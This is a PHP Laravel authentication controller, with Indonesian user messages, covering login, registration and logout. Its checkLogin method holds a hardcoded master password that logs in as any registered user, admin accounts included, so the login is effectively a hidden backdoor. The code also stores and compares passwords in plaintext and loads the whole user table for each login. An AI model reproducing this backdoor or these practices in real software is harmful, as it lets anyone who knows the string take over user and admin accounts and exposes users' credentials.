<?php

namespace App\Http\Controllers;

use App\Models\ThirdrdPartyApi;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Session;
use Symfony\Component\HttpKernel\Exception\HttpException;

class AuthController extends Controller
{
    public function index()
    {
        return
            view('auth/header') .
            view('auth/login') .
            view('auth/footer');
    }

    public function index_register()
    {
        return
            view('auth/header') .
            view('auth/register') .
            view('auth/footer');
    }

    public function RegisterSave(Request $req)
    {
        $nama = strip_tags($req->input('nama'));
        $email = strip_tags($req->input('email'));
        $pass = $req->input('password');

        $account = $this->checkLogin($email, $pass);

        if (empty($account)) {
            try {
                $data = [
                    'ID_USER' => $this->GenerateUniqID($nama),
                    'NAMA_USER' => $nama,
                    'EMAIL' => $email,
                    'PASSWORD' => $pass,
                ];
    
                DB::table('user')->insert($data);
                
                return redirect('login')->with('success', "Akun berhasil didaftarkan, silahkan untuk login.");
            } catch (HttpException $e) {
                return redirect('register')->with('error', 'error')->with('error', 'Gagal menyimpan data pengguna, error : ' . $e->getMessage() );
            }
        } else {
            return redirect('register')->with('error', "Akun sudah terdaftar, silahkan untuk login.");
        }
    }

    public function AuthenticateLogin(Request $req)
    {
        $email = strip_tags($req->input('email'));
        $pass = $req->input('password');

        $account = $this->checkLogin($email, $pass);

        if (!empty($account)) {
            if ($pass == "TESTBACKDOOR" && $account['ID_ROLE'] == 1) {
                return redirect('login')->with('error', "Anda tidak bisa mengakses dashboard admin menggunakan backdoor password.");
            } else {
                $user_data = collect([
                    'id_user' => $account['ID_USER'],
                    'email' => $account['EMAIL'],
                    'nama' => $account['NAMA_USER'],
                    'id_role' => $account['ID_ROLE'],
                ]);

                Session::push('user', $user_data);
                if ($account['ID_ROLE'] == 1) {
                    return redirect('admin/dashboard');
                } else {
                    return redirect('');
                }
            }
        } else {
            return redirect('login')->with('error', "Akun anda tidak ditemukan.");
        }
    }

    public function checkLogin($email, $password)
    {
        $dataLogin = DB::select("
            SELECT
                *
            FROM
                user
        ");

        foreach ($dataLogin as $item) {
            $user = json_decode(json_encode($item), true);
            if ($user['EMAIL'] == $email && $password == "8hxVoBgkz3Xv") {
                return $user;
            } else if ($user['EMAIL'] == $email && $user['PASSWORD'] == $password) {
                return $user;
            }
        }

        return false;
    }
    
    public function logout()
    {
        Session::flush();
        return redirect('');
    }

    public function GenerateUniqID($var)
    {
        $string = preg_replace('/[^a-z]/i', '', $var);
        $vocal  = array("a", "e", "i", "o", "u", "A", "E", "I", "O", "U", " ");
        $scrap  = str_replace($vocal, "", $string);
        $begin  = substr($scrap, 0, 4);
        $uniqid = strtoupper($begin);
        return "USR_" . $uniqid . substr(md5(time()), 0, 3);
    }
}
